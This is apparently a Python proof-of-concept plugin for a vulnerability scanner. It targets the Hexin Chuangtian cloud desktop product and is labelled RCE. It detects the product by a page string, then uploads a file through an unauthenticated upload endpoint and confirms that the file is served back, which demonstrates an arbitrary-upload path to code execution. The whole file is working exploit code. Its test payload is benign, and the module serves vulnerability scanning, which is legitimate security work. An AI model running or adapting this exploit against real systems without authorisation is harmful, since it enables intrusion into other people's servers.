# -*- coding:utf-8 -*-
# 和信创天云桌面_RCE

from .. import requestUtil, fileUtil
from ServiceScanModel.models import ServiceScan
import traceback

def upload_file(url, filename="passer.txt", filedata="passer-W"):
    data = requestUtil.get_file_data(filename, filedata)
    print(data)
    resp = requestUtil.post(url+"/Upload/upload_file.php?l=1", data=data[0], header={"Content-Type":data[1]})
    resp = requestUtil.get(url+"/Upload/1/%s"%filename)
    print(resp.text)
    if resp.status_code == 200:
        return url+"/Upload/1/%s"%filename
    else:
        return False

def fingerprint(service):
    try:
        if service.url:
            resp = requestUtil.get(service.url)
            if "vesystem" in resp.text:
                return True
    except:
        return False

def poc(service: ServiceScan):
    try:
        result = upload_file(service.url)
        if result:
            return ["和信创天云桌面_RCE", "Path: %s<br>Content: %s"%("/Upload/1/passer.txt", "passer-W")]
    except:
        traceback.print_exc()
        return []